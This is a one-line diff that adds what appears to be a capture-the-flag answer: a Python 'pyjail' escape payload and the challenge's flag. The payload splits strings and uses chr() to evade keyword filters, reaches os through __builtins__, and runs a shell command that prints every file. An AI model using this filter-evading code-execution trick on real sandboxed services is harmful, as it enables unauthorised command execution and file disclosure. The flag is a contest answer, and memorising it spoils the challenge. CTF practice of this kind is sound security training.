@@ -1,0 +1,1 @@
+The command to escape pyjail is: getattr(getattr(globals()['__buil'+'tins__'],'__im'+'port__')('o'+'s'),'sys'+'tem')('cat'+chr(32)+'*') Flag is: kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}
